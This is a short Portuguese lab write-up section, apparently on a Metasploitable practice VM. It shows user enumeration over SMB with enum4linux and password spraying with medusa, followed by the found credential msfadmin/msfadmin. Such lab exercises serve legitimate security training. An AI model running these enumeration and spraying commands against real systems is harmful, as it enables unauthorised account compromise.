# 5. Password Spraying em SMB com Medusa

## 5.1 Enumeração de usuários
`enum4linux -a 192.168.56.5 | grep user`


Wordlist gerada:
- root
- daemon
- msfadmin

## 5.2 Password Spraying
`medusa -h 192.168.56.5 -U users.txt -p "msfadmin" -M smbnt`

✔ Resultado encontrado:
`ACCOUNT FOUND: [smbnt] Host: 192.168.56.5 User: msfadmin Password: msfadmin`